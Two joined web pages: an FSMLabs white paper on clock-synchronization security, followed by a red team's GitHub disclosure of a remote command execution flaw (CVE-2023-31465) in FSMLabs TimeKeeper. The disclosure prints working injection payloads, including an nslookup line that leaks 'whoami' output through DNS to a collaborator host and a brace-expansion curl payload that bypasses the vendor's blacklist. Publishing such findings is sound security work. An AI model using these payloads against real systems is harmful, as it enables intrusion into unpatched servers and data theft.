=== Content from fsmlabs.com_00315e8b_20250111_004153.html ===


[Skip to content](#content)

FSMLabs
Secure Enterprise Clock Sync
[![FSMLabs](data:image/gif;base64...)![FSMLabs](data:image/gif;base64...)](https://fsmlabs.com/)

* [Products](https://fsmlabs.com/products/)
  + [Client](https://fsmlabs.com/products/client/)
  + [Compliance](https://fsmlabs.com/products/compliance/)
  + [Grandmaster](https://fsmlabs.com/products/grandmaster/)
  + [Platform](https://fsmlabs.com/products/platform/)
  + [Server](https://fsmlabs.com/products/server/)
* [Solutions](https://fsmlabs.com/solutions/)
  + [Financial](https://fsmlabs.com/solutions/financial/)
  + [5G IOT](https://fsmlabs.com/solutions/5g-iot/)
  + [Automation](https://fsmlabs.com/solutions/automation/)
  + [Broadcast](https://fsmlabs.com/solutions/broadcast/)
  + [Cloud Database](https://fsmlabs.com/solutions/cloud-database/)
  + [Cybersecurity](https://fsmlabs.com/solutions/cybersecurity/)
  + [Data Center](https://fsmlabs.com/solutions/data-center/)
  + [Gaming](https://fsmlabs.com/solutions/gaming/)
* [Resources](https://fsmlabs.com/resources/)
  + [End User License Agreements](https://fsmlabs.com/resources/tkeula/)
* [Support](https://fsmlabs.com/support/)
* [Company](https://fsmlabs.com/about/company/)
  + [Timeline](https://fsmlabs.com/about/timeline/)
  + [Technology](https://fsmlabs.com/about/technology/)
  + [Customers](https://fsmlabs.com/about/customers/)
  + [Patents](https://fsmlabs.com/about/patents/)
  + [Partners](https://fsmlabs.com/about/partners/)
  + [Careers](https://fsmlabs.com/about/careers/)
  + [News](https://fsmlabs.com/about/news/)
* [Blog](https://fsmlabs.com/blog/)
* [Contact](https://fsmlabs.com/contact/)

[Book a Demo](https://fsmlabs.com/book-demo/)

* [Products](https://fsmlabs.com/products/)
  + [Client](https://fsmlabs.com/products/client/)
  + [Compliance](https://fsmlabs.com/products/compliance/)
  + [Grandmaster](https://fsmlabs.com/products/grandmaster/)
  + [Platform](https://fsmlabs.com/products/platform/)
  + [Server](https://fsmlabs.com/products/server/)
* [Solutions](https://fsmlabs.com/solutions/)
  + [Financial](https://fsmlabs.com/solutions/financial/)
  + [5G IOT](https://fsmlabs.com/solutions/5g-iot/)
  + [Automation](https://fsmlabs.com/solutions/automation/)
  + [Broadcast](https://fsmlabs.com/solutions/broadcast/)
  + [Cloud Database](https://fsmlabs.com/solutions/cloud-database/)
  + [Cybersecurity](https://fsmlabs.com/solutions/cybersecurity/)
  + [Data Center](https://fsmlabs.com/solutions/data-center/)
  + [Gaming](https://fsmlabs.com/solutions/gaming/)
* [Resources](https://fsmlabs.com/resources/)
  + [End User License Agreements](https://fsmlabs.com/resources/tkeula/)
* [Support](https://fsmlabs.com/support/)
* [Company](https://fsmlabs.com/about/company/)
  + [Timeline](https://fsmlabs.com/about/timeline/)
  + [Technology](https://fsmlabs.com/about/technology/)
  + [Customers](https://fsmlabs.com/about/customers/)
  + [Patents](https://fsmlabs.com/about/patents/)
  + [Partners](https://fsmlabs.com/about/partners/)
  + [Careers](https://fsmlabs.com/about/careers/)
  + [News](https://fsmlabs.com/about/news/)
* [Blog](https://fsmlabs.com/blog/)
* [Contact](https://fsmlabs.com/contact/)

# FSMLabs Cybersecurity

Finite State Machine Labs Inc (FSMLabs)

FSMLabs is a US (Austin, Texas) based technology development company focused on clock synchronization. FSMLabs’s  “TimeKeeper® ”,software and hardware  is  employed  by 6 of the world’s 10 largest banks, the InterContinental Exchange (owners of the NY Stock Exchange), and some of the most technically advanced electronic trading companies for precise (often within 50 nanoseconds of NIST/UTC) and resilient clock synchronization. Other customers include first responders (for emergency access), MITRE, and Airbus (Singapore Air Force). The company has a number of key patents, including patents on the multi-source fault tolerance and on methods for monitoring the security of GPS and other satellite based (GNSS) clock source.

[![](https://fsmlabs.com/wp-content/uploads/2021/04/graph.png)](https://fsmlabs.com/wp-content/uploads/2021/04/graph.png)

All FSMLabs technology development takes place in the United States.

**FSMLabs has, patented, clock synchronization technology that changed the scope of what clock sync technology can do, and is mature and in production in some of the most important time-critical venues in the world.  FSMLabs has advanced R&D to take these products to a higher level and to apply them to other critical sectors.**

# Clock Synchronization Executive Summary

Clock Synchronization is a keystone technology in telecommunications and financial asset trading and is rapidly emerging as critical in a wide range of applications relating to information technology, data centers, and communications. These applications include radio/TV broadcast, smart automobiles, large scale databases, industrial automation, and software defined radios.

The basic task is deceptively simple: to keep the clocks on multiple computing devices locked on to a common time:  often a reference time like the National Institute of Standards and Technology reference clock or UTC.

**As some brief examples:**

Because of regulatory requirements and fundamental business logic (operational and data integrity), electronic financial asset trading depends on synchronizing clocks, often down to less than 1 microsecond.

Clock synchronization plays a fundamental role in large scale commercial and government distributed systems and has recently been identified as an enabling technology for global databases.

The transition to packet networks in Radio and TV broadcasting and the increase in frame rates requires distributed synchronized clocks.

# Clock Synchronization and Security

*The Department must be prepared to defend non-DoD-owned Defense Critical Infrastructure (DCI) and Defense Industrial Base (DIB) networks and systems. Our chief goal in maintaining an ability to defend DCI is to ensure the infrastructure’s continued functionality and ability to support DoD objectives in a contested cyber environment. (Department of Defense 2018)*

Although clock synchronization is widely used in military applications (including, for example, frequency switching software defined radios and drone navigation), this document will focus primarily on civilian applications which is the current area of expertise for FSMLabs. Interruption or compromise of clock sync could have devasting consequences for US financial markets, industrial systems, and e-commerce (Dropping 2018).

The fragility of legacy clock synchronization systems is the source of vulnerabilities that can be addressed by defense-in-depth (FSMLabs 2019). On the other hand,  clock synchronization technologies can also be employed to control certain types of security mechanisms (V. Yodaiken, Systems and methods for detecting a security breach in a computer system 2014).

The vulnerabilities range from tampering with satellite clock source signal  (Humphreys 2008) (Dougan 2018) to compromising network security (C. D. Yodaiken 2017). The second type of vulnerability is highlighted by the failure of Eurex in 2013 when a single word memory failure on a single device shut down the entire trading system (Timms 2015).   As a software example, the IEEE PTP 1588 “Best Master Clock” algorithm is an easily spoofed mechanism for determining the “best” time source (FSMLabs 2017).  FSMLabs multi-source fault-tolerance methods provides resiliency against both inadvertent component or network failures and deliberate compromise (C. D. Yodaiken 2017). Unlike technologies that are hosted within a GPS/GNSS clock, the FSMLabs methods extend down to the consumer of the clock – the application that requires reliable time. Both IEEE 1588 PTP and the older NTP protocols are supported at equivalent sub-microsecond accuracy and security. Proposals for mechanisms that are similar to FSMLabs “source check” have recently been endorsed in the IEEE 1588 PTP revisions nearly a decade after FSMLabs put this  complex technology into production and patented it (V. Yodaiken, The Enterprise Profile for PTP 2015).

[![](data:image/gif;base64...)](https://fsmlabs.com/wp-content/uploads/2021/04/finance_and_beyond_WP_skymap-1024x852.png)

*Figure 1  SkyMap view of GNSS constellations*

Financial networks have been the obvious targets, and disrupting clock sync in a first responder system, automated manufacturing, power plants or in data centers, could have more significant effects. For example Google has recently identified clock synchronization methods for operating global databases  (James Corbett 2012)  and clock sync has been widely employed in data systems for decades  (Liskov 1993).

# Summary

Clock synchronization is a key technology for operation and security of the entire US technology landscape, extending from financial markets through electric power distribution.

There are numerous, identified and not widely appreciated vulnerabilities in legacy clock synchronization technology, many of which are addressed in field tested solutions FSMLabs has deployed.

There are avenues for using clock synchronization to improve the security of sectors that do not normally utilize clock synchronization.

FSMLabs has in production, mature technologies that could be incorporated in a defense in depth protection strategy to address issues noted in the 2018 DOD Cyber Security Strategy.

FSMLabs has R&D projects that could be rapidly incorporated into existing systems.

# Bibliography

Department of Defense. 2018. “Cyber Strategy Summary 2018.” *Department of Defense.* https://media.defense.gov/2018/Sep/18/2002041658/-1/-1/1/CYBER\_STRATEGY\_SUMMARY\_FINAL.PDF.

Dougan, Cort. 2018. Method, system, and computer program product for GNSS receiver signal health and security analysis. USA Patent 10,024,975. July 17.

Dropping, Coggins, Platt. 2018. “Timing Security: Mitigating Threats in a Changing Landscape Webinar.” *ATIS.* May 22. https://www.atis.org/wp-content/uploads/01\_news\_events/webinar-pptslides/Timing-Security5222018.pdf.

6. *www.finra.org.* https://www.finra.org/rules-guidance/rulebooks/finra-rules/6820.

—. 2019. “Clock Sync Safety and Security in Depth.” *WSTS 2019 Talks.* https://wsts.atis.org/wp-content/uploads/sites/9/2019/03/4\_06\_FSMLabs\_Dougan\_Security\_for\_Enterprise\_in\_Depth.pdf.

—. 2017. “Smart and dumb clients and the “so-called” Best Master Clock Algorithm in PTP IEEE 1588.” *medium.com/fsmlabs.* April 21. https://medium.com/fsmlabs/smart-and-dumb-clients-and-the-so-called-best-master-clock-algorithm-in-ptp-ieee-1588-6739608d4cff.

Humphreys, Todd E., et al. 2008. “”Assessing the spoofing threat: Development of a portable GPS civilian spoofer.”.” *Radionavigation laboratory conference proceedings.*

James Corbett, Jeffrey Dean, Michael Epstein, Andrew Fikes, Christopher Frost, J. J. Furman, Sanjay Ghemawat, Andrey Gubarev, Christopher Heiser, Peter Hochschild, Wilson Hsieh, Sebastian Kanthak, Eugene Kogan, Hongyi Li, Alexander Lloyd, Sergey Melnik,. 2012. “Spanner: Google’s globally-distributed database.” *Proceedings of the 10th USENIX Conference on Operating Systems Design and Implementation.* USENIX.

Liskov, Barbara. 1993. “Practical uses of synchronized clocks in distributed systems.” *Distributed Computing*211-219.

Timms, Aaron. 2015. “Y2K.00001: Markets Take a Leap Second Into the Void.” *Institutional Investor.* June 30. https://www.institutionalinvestor.com/article/b14z9ydlpr8hln/y2k00001-markets-take-a-leap-second-into-the-void.

Yodaiken, Cort Dougan and Victor. 2017. Method, time consumer system, and computer program product for maintaining accurate time on an ideal clock. USA Patent 9,671,761. June 6.

Yodaiken, Victor. 2014. Systems and methods for detecting a security breach in a computer system. USA Patent 8,793,794. July 29.

—. 2015. “The Enterprise Profile for PTP and TimeKeeper.” *www.yodaiken.com.* October 1.

Category: [Uncategorized](https://fsmlabs.com/category/uncategorized/)[By FSMLabs](https://fsmlabs.com/author/assima/ "View all posts by FSMLabs")[April 5, 2021](https://fsmlabs.com/2021/04/05/ "10:41 pm")

#### Author: FSMLabs

<https://fsmtime.wpengine.com>

## Post navigation

[PreviousPrevious post:Nanosecond Range Windows Accuracy with TimeKeeper](https://fsmlabs.com/nanosecond-range-windows-accuracy-with-timekeeper/)
### Related Posts

[![](data:image/svg+xml...)](https://fsmlabs.com/apple-watch-time-technology/)[Apple Watch time technology](https://fsmlabs.com/apple-watch-time-technology/)
April 5, 2021[Best Practices with TimeKeeper® SourceCheck (2016)](https://fsmlabs.com/best-practices-with-timekeeper-sourcecheck-2016/)
April 5, 2021[![](data:image/svg+xml...)](https://fsmlabs.com/leapsecond-eve-2016/)[Leapsecond Eve 2016](https://fsmlabs.com/leapsecond-eve-2016/)
April 2, 2021[Time out of joint](https://fsmlabs.com/time-out-of-joint/)
April 2, 2021[Minimizing Spend on MiFID II Compliance](https://fsmlabs.com/minimizing-spend-on-mifid-ii-compliance/)
April 2, 2021[FINRA moves towards tighter timing requirements](https://fsmlabs.com/finra-moves-towards-tighter-timing-requirements/)
April 2, 2021

Copyright © 2021 FSMLabs | All rights reserved.

Go to Top

![](https://ws.zoominfo.com/pixel/7O96qL4V8hj9B0Xuhxbk)



=== Content from github.com_82d603c3_20250111_004153.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCapgeminiCisRedTeam%2FDisclosure%2Fblob%2Fmain%2FCVE%2520PoC%2FCVE-2023-31465.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCapgeminiCisRedTeam%2FDisclosure%2Fblob%2Fmain%2FCVE%2520PoC%2FCVE-2023-31465.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=CapgeminiCisRedTeam%2FDisclosure)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[CapgeminiCisRedTeam](/CapgeminiCisRedTeam)
/
**[Disclosure](/CapgeminiCisRedTeam/Disclosure)**
Public

* [Notifications](/login?return_to=%2FCapgeminiCisRedTeam%2FDisclosure) You must be signed in to change notification settings
* [Fork
  3](/login?return_to=%2FCapgeminiCisRedTeam%2FDisclosure)
* [Star
   2](/login?return_to=%2FCapgeminiCisRedTeam%2FDisclosure)

* [Code](/CapgeminiCisRedTeam/Disclosure)
* [Issues
  0](/CapgeminiCisRedTeam/Disclosure/issues)
* [Pull requests
  0](/CapgeminiCisRedTeam/Disclosure/pulls)
* [Actions](/CapgeminiCisRedTeam/Disclosure/actions)
* [Projects
  0](/CapgeminiCisRedTeam/Disclosure/projects)
* [Security](/CapgeminiCisRedTeam/Disclosure/security)
* [Insights](/CapgeminiCisRedTeam/Disclosure/pulse)

Additional navigation options

* [Code](/CapgeminiCisRedTeam/Disclosure)
* [Issues](/CapgeminiCisRedTeam/Disclosure/issues)
* [Pull requests](/CapgeminiCisRedTeam/Disclosure/pulls)
* [Actions](/CapgeminiCisRedTeam/Disclosure/actions)
* [Projects](/CapgeminiCisRedTeam/Disclosure/projects)
* [Security](/CapgeminiCisRedTeam/Disclosure/security)
* [Insights](/CapgeminiCisRedTeam/Disclosure/pulse)

## Files

 main
## Breadcrumbs

1. [Disclosure](/CapgeminiCisRedTeam/Disclosure/tree/main)
2. /[CVE PoC](/CapgeminiCisRedTeam/Disclosure/tree/main/CVE%20PoC)
/
# CVE-2023-31465.md

Copy path Blame  Blame
## Latest commit

## History

[History](/CapgeminiCisRedTeam/Disclosure/commits/main/CVE%20PoC/CVE-2023-31465.md)78 lines (44 loc) · 2.96 KB main
## Breadcrumbs

1. [Disclosure](/CapgeminiCisRedTeam/Disclosure/tree/main)
2. /[CVE PoC](/CapgeminiCisRedTeam/Disclosure/tree/main/CVE%20PoC)
/
# CVE-2023-31465.md

Top
## File metadata and controls

* Preview
* Code
* Blame

78 lines (44 loc) · 2.96 KB[Raw](https://github.com/CapgeminiCisRedTeam/Disclosure/raw/refs/heads/main/CVE%20PoC/CVE-2023-31465.md)
# CVE-2023-31465 | TimeKeeper by FSMLabs - RCE

During a PT activity, we managed to find a Remote Command Execution vulnerability in TimeKeeper and, while fixing it, we had the opportunity to modify and evolve the payload.
In the first paragraph we are going to explain the discovery and exploitation of the vulnerability, and this was performed during the time of the penetration testing, while in the second paragraph
we will show the fix attempts, the re-exploitation and the final countermeasure.

## TimeKeeper version 8.0.17

In the image below is represented the request that is employed by TimeKeeper in order to set the source of IPs that has to be synchronized.

[![req](https://private-user-images.githubusercontent.com/132057950/256232373-f6e13bf7-2755-40f4-8d8c-09cf66116815.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyMzczLWY2ZTEzYmY3LTI3NTUtNDBmNC04ZDhjLTA5Y2Y2NjExNjgxNS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02MGI5ZmM2NjJkNjdkMDU5MWViZGVhYzFhYjIwYWYxZjBlYTZkZGIzNjlkMjhhYjk4MmJhMWZlY2QzNzQ0ZGNkJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.CY2Mbhj46YbLMyC1l8MSsGDiRd--cTu3YPlqiSzdcmM)](https://private-user-images.githubusercontent.com/132057950/256232373-f6e13bf7-2755-40f4-8d8c-09cf66116815.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyMzczLWY2ZTEzYmY3LTI3NTUtNDBmNC04ZDhjLTA5Y2Y2NjExNjgxNS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02MGI5ZmM2NjJkNjdkMDU5MWViZGVhYzFhYjIwYWYxZjBlYTZkZGIzNjlkMjhhYjk4MmJhMWZlY2QzNzQ0ZGNkJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.CY2Mbhj46YbLMyC1l8MSsGDiRd--cTu3YPlqiSzdcmM)

During our first analysis, we used some Windows and Linux concatenation strings with the `ping` command to check a potential RCE vulnerability.
We first discovered it in the *arg2* query parameter, with the following payload appended to the **earliest** number value:

```
||ping -c 10 127.0.0.1

```

A time delay was triggered, so we kept testing with other techniques and payloads.

After some time, we uncovered the following payload, useful for retrieving hex-encoded information (the data has been hex-encoded with *xxd* in order to avoid cutting off due to the DNS protocol):

```
||nslookup $(xxd -pu <<< $(whoami)).OASTIFY.DOMAIN||x

```

Below you can observe, respectively:

* the malicious request;

[![poc1](https://private-user-images.githubusercontent.com/132057950/256232522-1a99f5a7-939a-4bfd-aab9-f9226e0d3351.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNTIyLTFhOTlmNWE3LTkzOWEtNGJmZC1hYWI5LWY5MjI2ZTBkMzM1MS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00ZmZhMmQ2M2YxYWNmYjg2ZGY3YTY2YWVmZGRkNTY0MjRhZjRjMmQ1ZTFjMjYxZmIyZTYxMzU0OTE4ZDJhMWY3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.BT1qyQuUNh73sVizfwC6CAj2CD2vRwT2wVfQIqFfHxk)](https://private-user-images.githubusercontent.com/132057950/256232522-1a99f5a7-939a-4bfd-aab9-f9226e0d3351.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNTIyLTFhOTlmNWE3LTkzOWEtNGJmZC1hYWI5LWY5MjI2ZTBkMzM1MS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00ZmZhMmQ2M2YxYWNmYjg2ZGY3YTY2YWVmZGRkNTY0MjRhZjRjMmQ1ZTFjMjYxZmIyZTYxMzU0OTE4ZDJhMWY3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.BT1qyQuUNh73sVizfwC6CAj2CD2vRwT2wVfQIqFfHxk)

* the burp collaborator DNS interactions with hex-data exfiltrated;

[![poc2](https://private-user-images.githubusercontent.com/132057950/256232696-265b70a5-a80c-4dea-9143-5663f9aab18b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNjk2LTI2NWI3MGE1LWE4MGMtNGRlYS05MTQzLTU2NjNmOWFhYjE4Yi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wNjlkMGM4ZjIxYmMyNWVkOTQ5YzY2OWUzM2JjNWE2MWIzYWY1NTA5YmI0MDQzMGFmYzE4ZDhjOWZkMmZhYWY5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VspROFsSeESHutrV7o_d9umiBoNkclIDrsO2nIen0rE)](https://private-user-images.githubusercontent.com/132057950/256232696-265b70a5-a80c-4dea-9143-5663f9aab18b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNjk2LTI2NWI3MGE1LWE4MGMtNGRlYS05MTQzLTU2NjNmOWFhYjE4Yi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wNjlkMGM4ZjIxYmMyNWVkOTQ5YzY2OWUzM2JjNWE2MWIzYWY1NTA5YmI0MDQzMGFmYzE4ZDhjOWZkMmZhYWY5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VspROFsSeESHutrV7o_d9umiBoNkclIDrsO2nIen0rE)

* the hex-decoded results of `whoami` and `id` commands.

[![poc3](https://private-user-images.githubusercontent.com/132057950/256232758-61f12806-36ba-46b7-b0d0-c928e0b7275d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNzU4LTYxZjEyODA2LTM2YmEtNDZiNy1iMGQwLWM5MjhlMGI3Mjc1ZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT01YTU3ODU3YjdkNWEzNWJiZDJmNWY4ZTg2NDk5Njk0MzZhZDI4ZTliOTYyZDRkM2Q0MDQzZTkwOWQzZjAwNzBmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9._xEHiEH0PqmGiHlBy0Z5fbzE4dXjjvr0fj5zwyVjXdY)](https://private-user-images.githubusercontent.com/132057950/256232758-61f12806-36ba-46b7-b0d0-c928e0b7275d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNzU4LTYxZjEyODA2LTM2YmEtNDZiNy1iMGQwLWM5MjhlMGI3Mjc1ZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT01YTU3ODU3YjdkNWEzNWJiZDJmNWY4ZTg2NDk5Njk0MzZhZDI4ZTliOTYyZDRkM2Q0MDQzZTkwOWQzZjAwNzBmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9._xEHiEH0PqmGiHlBy0Z5fbzE4dXjjvr0fj5zwyVjXdY)

## TimeKeeper version 8.0.28 (BETA)

After discovering the vulnerability, we contacted directly FSMLabs to notify about the critical vulnerability.
They thanked and asked us to conduct more tests on the BETA version to ensure that the vulnerability has been fixed in the meanwhile, as version 8.0.17 was over 2 years old at the time of testing
(2023).

A blacklist was implemented for some characters, such as: |, &, \*, $, <, >, (, ), -. The previous payload, then, could not be used anymore. However, curly brackets were not
blacklisted, so we tried with the *bash expansion* technique.

Specifically, the following payload was injected:

```
;{curl,`whoami`.[collaborator_domain]};a

```

and we were still able to conduct a remote command execution.

## Remediation

The FSMLabs has fixed the vulnerability in TimeKeeper version 8.0.28.

## Vulnerable version of TimeKeeper

